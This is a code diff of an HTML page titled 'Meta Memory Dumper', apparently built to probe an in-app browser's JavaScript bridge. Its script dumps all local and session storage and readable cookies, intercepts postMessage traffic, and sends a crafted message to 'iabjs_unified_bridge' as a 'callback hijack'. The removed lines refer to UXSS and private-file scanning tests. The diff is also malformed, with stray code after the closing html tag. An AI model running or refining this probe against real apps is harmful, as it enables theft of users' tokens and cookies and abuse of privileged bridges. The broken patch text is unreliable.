@@ -2,38 +2,89 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Memory Dumper</title>
     <style>
-        body { background: #0a0a0a; color: #ff3e3e; font-family: monospace; padding: 15px; }
-        .card { border: 1px solid #ff3e3e; padding: 10px; margin-bottom: 15px; background: #000; }
-        button { background: #1a0000; color: #ff3e3e; border: 1px solid #ff3e3e; padding: 10px; width: 100%; margin: 5px 0; }
-        .log { background: #000; height: 250px; overflow-y: scroll; border: 1px dashed #555; padding: 5px; font-size: 10px; color: #00ff00; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 15px; }
+        .card { border: 1px solid #333; padding: 10px; margin-bottom: 15px; background: #111; }
+        button { background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 12px; width: 100%; margin: 5px 0; font-weight: bold; }
+        .log { background: #000; height: 300px; overflow-y: scroll; border: 1px solid #444; padding: 10px; font-size: 11px; color: #00ffff; }
+        .found { color: #ffff00; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h3>1. UXSS & Origin Bypass</h3>
-        <button onclick="testUXSS()">Test Cross-Origin Leak</button>
-        <iframe id="victimFrame" src="https://example.com" style="display:none"></iframe>
+        <h3>Memory & Token Dumper</h3>
+        <button onclick="dumpAllStorage()">1. Dump All Storage (Tokens?)</button>
+        <button onclick="checkCookies()">2. Check Document Cookies</button>
+        <button onclick="fuzzBridgeEvents()">3. Listen for Bridge Leaks</button>
     </div>
 
-    <div class="card">
-        <h3>2. Sensitive File Scanner</h3>
-        <button onclick="scanPrivateFiles()">Scan /data/data/ Paths</button>
-    </div>
-
-    <div class="card">
-        <h3>3. Bridge Error Leaker</h3>
-        <button onclick="leakStack()">Force Bridge Stack Trace</button>
-    </div>
-
-    <div id="log" class="log">Ready for advanced testing...</div>
+    <div id="log" class="log">Scanning for sensitive memory fragments...</div>
 
     <script>
         const logBox = document.getElementById('log');
-        function log(m, color="#00ff00") { 
-            logBox.innerHTML += `<br><span style="color:${color}">> ${m}</span>`; 
-            logBox.scrollTop = logBox.scrollHeight; 
+        function log(m, cls='') { 
+            logBox.innerHTML += `<div class="${cls}">> [${new Date().toLocaleTimeString()}] ${m}</div>`; 
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+
+        // 1. Storage Dumping
+        function dumpAllStorage() {
+            log("Scanning Local & Session Storage...");
+            let found = 0;
+            [localStorage, sessionStorage].forEach((storage, idx) => {
+                let type = idx === 0 ? "Local" : "Session";
+                for (let i = 0; i < storage.length; i++) {
+                    let key = storage.key(i);
+                    let val = storage.getItem(key);
+                    log(`[${type}] FOUND: ${key} = ${val.substring(0, 30)}...`, "found");
+                    found++;
+                }
+            });
+            if(found === 0) log("No keys found in storage.");
+        }
+
+        // 2. Cookie Check
+        function checkCookies() {
+            log("Reading document.cookie...");
+            const cookies = document.cookie;
+            if (cookies) {
+                log("COOKIES DETECTED: " + cookies, "found");
+            } else {
+                log("No non-HttpOnly cookies found.");
+            }
+        }
+
+        // 3. Force Bridge to emit something
+        function fuzzBridgeEvents() {
+            log("Pinging bridge for event leaks...");
+            // Triggering a fake event to see if the bridge responds with data
+            try {
+                window.dispatchEvent(new Event('DOMContentLoaded'));
+                window.dispatchEvent(new Event('load'));
+                
+                // If the bridge is iabjs, try to trigger a callback
+                if (window.iabjs_unified_bridge) {
+                    log("Attempting iabjs callback hijack...");
+                    window.iabjs_unified_bridge.postMessage(JSON.stringify({
+                        "handler": "AnalyticsHandler",
+                        "method": "logEvent",
+                        "data": {"event_name": "test_exploit"}
+                    }), "*");
+                }
+            } catch(e) {
+                log("Bridge Error: " + e.message, "found");
+            }
+        }
+
+        // Passive Listener
+        window.addEventListener("message", (e) => {
+            log("INTERCEPTED DATA: " + JSON.stringify(e.data), "found");
+        });
+    </script>
+</body>
+</html>
         }
 
         // 1. Cross-Origin Access Test
